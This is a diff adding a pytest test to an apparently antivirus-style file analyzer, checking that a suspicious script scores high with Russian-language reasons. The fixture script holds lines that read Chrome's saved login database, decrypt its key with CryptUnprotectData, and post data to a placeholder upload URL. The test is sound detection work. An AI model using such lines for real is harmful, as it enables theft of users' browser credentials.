@@ -65,3 +65,22 @@ def test_exact_high_confidence_ioc_requires_both_known_name_and_known_path():
     assert is_exact_ioc_file(exact) is True
     assert is_exact_ioc_file(path_only) is False
     assert is_exact_ioc_file(name_only) is False
+
+
+
+def test_analyze_script_detects_browser_credentials_decryption_and_exfiltration(tmp_path):
+    from src.antivir.core import analyze_file
+
+    script = tmp_path / "suspicious.ps1"
+    script.write_text(
+        'sqlite3.connect("Chrome\\\\User Data\\\\Default\\\\Login Data")\n'
+        'CryptUnprotectData($encryptedKey)\n'
+        'Invoke-RestMethod -Uri "https://example.invalid/upload" -Method Post',
+        encoding="utf-8",
+    )
+
+    result = analyze_file(script)
+
+    assert result.score >= 80
+    assert any("браузера" in reason.lower() for reason in result.reasons)
+    assert any("отправки данных" in reason.lower() for reason in result.reasons)
